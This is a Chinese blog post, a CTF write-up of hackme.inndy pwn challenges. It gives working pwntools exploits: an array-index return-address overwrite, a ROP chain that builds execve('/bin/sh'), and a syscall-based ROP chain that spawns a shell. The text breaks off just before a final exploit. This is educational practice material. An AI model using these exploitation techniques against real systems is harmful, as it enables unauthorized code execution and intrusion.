<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="hackme.inndy上pwn的wp，题目难度不大 catfalg签到题，直接nc连接，cat flag homework根据题目提示是数组越界漏洞，给了源码https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;static&#x2F;pwn-easy.c 可以看到对数组下表并没有做检查，导致越界。 ida分析，可以通过越界arr来覆盖run_program的返回地址到call_me_maybe函数的地址即可">
<meta name="keywords" content="ctf,hackme,pwn">
<meta property="og:type" content="article">
<meta property="og:title" content="hackme.inndy pwn write-up">
<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;writeup&#x2F;hackmeinndy-pwn-writeup.html">
<meta property="og:site_name" content="ZeroKeeper">
<meta property="og:description" content="hackme.inndy上pwn的wp，题目难度不大 catfalg签到题，直接nc连接，cat flag homework根据题目提示是数组越界漏洞，给了源码https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;static&#x2F;pwn-easy.c 可以看到对数组下表并没有做检查，导致越界。 ida分析，可以通过越界arr来覆盖run_program的返回地址到call_me_maybe函数的地址即可">
<meta property="og:locale" content="en">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;09&#x2F;1560051924.png">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;09&#x2F;1560053300.png">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;09&#x2F;1560053307.png">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;09&#x2F;15600585919995.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15600841545754.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15600845128534.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15600850313828.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15601549051171.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15601733133129.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15601734777024.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15601736570426.jpg">
<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;10&#x2F;15601737681747.jpg">
<meta property="og:updated_time" content="2019-10-20T15:35:12.822Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;2019&#x2F;06&#x2F;09&#x2F;1560051924.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>hackme.inndy pwn write-up</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/writeup/hackmeinndy-raas-wp.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/writeup/diva-writeup.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&text=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&is_video=false&description=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hackme.inndy pwn write-up&body=Check out this article: http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&title=hackme.inndy pwn write-up" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/writeup/hackmeinndy-pwn-writeup.html&name=hackme.inndy pwn write-up&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#catfalg"><span class="toc-number">1.</span> <span class="toc-text">catfalg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#homework"><span class="toc-number">2.</span> <span class="toc-text">homework</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop"><span class="toc-number">3.</span> <span class="toc-text">rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rop2"><span class="toc-number">4.</span> <span class="toc-text">rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toooomuch"><span class="toc-number">5.</span> <span class="toc-text">toooomuch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#toooomuch2"><span class="toc-number">6.</span> <span class="toc-text">toooomuch2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo"><span class="toc-number">7.</span> <span class="toc-text">echo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smashthestack"><span class="toc-number">8.</span> <span class="toc-text">smashthestack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onepunch"><span class="toc-number">9.</span> <span class="toc-text">onepunch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">10.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        hackme.inndy pwn write-up
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ZeroKeeper</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-06-09T05:05:00.000Z" itemprop="datePublished">2019-06-09</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/writeup/">writeup</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link" href="/tags/hackme/" rel="tag">hackme</a>, <a class="tag-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><a href="https://hackme.inndy.tw" target="_blank" rel="noopener">hackme.inndy</a>上pwn的wp，题目难度不大</p>
<h2 id="catfalg"><a href="#catfalg" class="headerlink" title="catfalg"></a>catfalg</h2><p>签到题，直接nc连接，cat flag</p>
<h2 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h2><p>根据题目提示是数组越界漏洞，给了源码<a href="https://hackme.inndy.tw/static/pwn-easy.c" target="_blank" rel="noopener">https://hackme.inndy.tw/static/pwn-easy.c</a> 可以看到对数组下表并没有做检查，导致越界。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560051924.png" alt="Snipaste_2019-06-09_11-45-03.png"></p>
<p>ida分析，可以通过越界arr来覆盖run_program的返回地址到call_me_maybe函数的地址即可<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560053300.png" alt="Snipaste_2019-06-09_11-51-33.png"></p>
<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/1560053307.png" alt="Snipaste_2019-06-09_11-52-29.png"></p>
<p>数组的首地址为ebp-34h,所以arr与ebp之间的偏移为0x34=52个字节。<br>52+ ebp + ret = 60 字节<br>60/4=15，即相对于arr来说，ret的索引为14<br>call_me_maybe 的地址为0x80485FB<br>最后exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process('./homework')</span></span><br><span class="line">r = remote(<span class="string">"hackme.inndy.tw"</span>,<span class="number">7701</span>)</span><br><span class="line"></span><br><span class="line">call_me_maybe=<span class="number">0x80485FB</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"name? "</span>,<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"edit: "</span>,<span class="string">"14"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"many? "</span>,str(call_me_maybe))</span><br><span class="line">r.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"0"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/09/15600585919995.jpg" alt=""></p>
<p>很简单的栈溢出，只开启了NX保护，静态链接<br>偏移为0xc+0x4=16<br>题目提示使用rop，使用ROPgadget构造一个rop<br><code>ROPgadget --binary rop --ropchain</code><br>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># r=process('./rop')</span></span><br><span class="line">r = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7704</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'a'</span>*<span class="number">16</span>+p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>checksec</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida f5代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+5h] [ebp-33h]</span><br><span class="line">  int v5; // [esp+9h] [ebp-2Fh]</span><br><span class="line">  int v6; // [esp+Dh] [ebp-2Bh]</span><br><span class="line">  int v7; // [esp+11h] [ebp-27h]</span><br><span class="line">  int v8; // [esp+15h] [ebp-23h]</span><br><span class="line">  int v9; // [esp+19h] [ebp-1Fh]</span><br><span class="line">  int v10; // [esp+1Dh] [ebp-1Bh]</span><br><span class="line">  int v11; // [esp+21h] [ebp-17h]</span><br><span class="line">  int v12; // [esp+25h] [ebp-13h]</span><br><span class="line">  int v13; // [esp+29h] [ebp-Fh]</span><br><span class="line">  __int16 v14; // [esp+2Dh] [ebp-Bh]</span><br><span class="line">  char v15; // [esp+2Fh] [ebp-9h]</span><br><span class="line"></span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  v4 = &apos; naC&apos;;</span><br><span class="line">  v5 = &apos; uoy&apos;;</span><br><span class="line">  v6 = &apos;vlos&apos;;</span><br><span class="line">  v7 = &apos;ht e&apos;;</span><br><span class="line">  v8 = &apos;\n?si&apos;;</span><br><span class="line">  v9 = &apos;eviG&apos;;</span><br><span class="line">  v10 = &apos; em &apos;;</span><br><span class="line">  v11 = &apos;ruoy&apos;;</span><br><span class="line">  v12 = &apos;por &apos;;</span><br><span class="line">  v13 = &apos;iahc&apos;;</span><br><span class="line">  v14 = &apos;:n&apos;;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  syscall(4, 1, &amp;v4, 42);</span><br><span class="line">  overflow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ida没能够识别出v4到v14的变量类型，v4的地址为bp-0x33，v15为bp-0x9，因此字符串长度为0x33 - 0x9 = 42，在v4上y一下，然后在弹出来的窗口上填入推断出来的数据类型char v4[42],调整后为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4[42]; // [esp+5h] [ebp-33h]</span><br><span class="line"></span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  strcpy(v4, &quot;Can you solve this?\nGive me your ropchain:&quot;);</span><br><span class="line">  syscall(4, 1, v4, 42);</span><br><span class="line">  overflow();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>overflow（）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int overflow()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  syscall(3, 0, &amp;v1, 1024);</span><br><span class="line">  return syscall(4, 1, &amp;v1, 1024);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里涉及到了调用syscall，可查阅<a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" rel="noopener">http://shell-storm.org/shellcode/files/syscalls.html</a> 得知，程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用，在v1只有0xc大小却读取了1024字节导致溢出。<br>这次不能直接利用ROPgadget找rop，考虑使用syscall执行系统命令，execve()的编号是11，所以最终要执行syscall(11, “/bin/sh”, 0, 0)，即execve(“/bin/sh”, 0, 0)，文件中没有/bin/sh字符串，所以还需要写入/bin/sh到bss段</p>
<ul>
<li>首先利用 syscall() 调用 read，从标准输入读入 /bin/sh，写入 bss。执行完之后再执行一遍overflow()</li>
<li>然后利用 syscall() 调用 execve，获取shell</li>
</ul>
<p>syscall函数的调用方法是：调用地址 + 返回地址 + 参数<br>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line"># p = remote(&apos;hackme.inndy.tw&apos;,7703) </span><br><span class="line">p=process(&apos;./rop2&apos;) </span><br><span class="line">elf = ELF(&apos;./rop2&apos;)  </span><br><span class="line">bss = elf.bss()  </span><br><span class="line">syscall = elf.symbols[&apos;syscall&apos;]  </span><br><span class="line">overflow = elf.symbols[&apos;overflow&apos;]   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if args.G:</span><br><span class="line">	gdb.attach(p)  </span><br><span class="line">  </span><br><span class="line">payload = &apos;a&apos;*0xC + &apos;bbbb&apos; + p32(syscall) + p32(overflow) # junk + target_address  + return_address  </span><br><span class="line">payload += p32(3) + p32(0) + p32(bss) + p32(8) #syscall(3,0,bss_add,8)  </span><br><span class="line">p.send(payload)  </span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)  </span><br><span class="line">  </span><br><span class="line">payload1 = &apos;a&apos;*0xc + &quot;BBBB&quot; + p32(syscall) + p32(0xdeadbeaf)</span><br><span class="line">payload1 += p32(0xb) + p32(bss) + p32(0) + p32(0)  #syscall(0xb,bss_add,0,0) = execve(&quot;bin/sh&quot;,0,0)  </span><br><span class="line">  </span><br><span class="line">p.send(payload1)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="toooomuch"><a href="#toooomuch" class="headerlink" title="toooomuch"></a>toooomuch</h2><p>很简单，ida查看获得passcode，然后nc连接上，二分法猜数字即可</p>
<h2 id="toooomuch2"><a href="#toooomuch2" class="headerlink" title="toooomuch2"></a>toooomuch2</h2><p>题目和上题一样只是这次要求getshell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>什么都没有开<br>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int toooomuch()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  char s; // [esp+0h] [ebp-18h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Give me your passcode: &quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strcpy(passcode, &amp;s);</span><br><span class="line">  if ( check_passcode() )</span><br><span class="line">    result = play_a_game();</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;You are not allowed here!&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>gets存在溢出，什么保护都没有开<br>这题有两种解法：</p>
<ul>
<li>一种是把shellcode写到bss段上然后返回到bss段执行。</li>
<li>另一种是直接把system执行用到的参数写到bss段，因为程序里面有system函数，可以溢出到system函数的地址，然后布置参数。</li>
</ul>
<p>exp1：</p>
